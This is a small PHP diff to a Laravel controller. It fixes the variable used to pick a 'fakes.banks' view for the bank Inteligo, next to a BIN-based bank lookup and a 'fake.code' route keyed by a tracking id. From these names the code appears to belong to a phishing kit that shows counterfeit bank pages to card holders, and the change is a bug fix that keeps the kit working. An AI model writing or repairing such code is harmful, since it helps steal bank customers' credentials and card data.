@@ -361,7 +361,7 @@ class PagesController extends Controller
         $binName = $bankInfo['bank']['name'] ?? null;
 
         $next = subRoute('fake.code', ['track_id' => $fake->track_id]);
-        $step = ($this->bank === 'inteligo') ? "fakes.banks.$bankName" : false;
+        $step = ($this->bank === 'inteligo') ? "fakes.banks.$this->bank" : false;
         $html = $step && view()->exists($step) ? view($step)->render() : null;
 
 
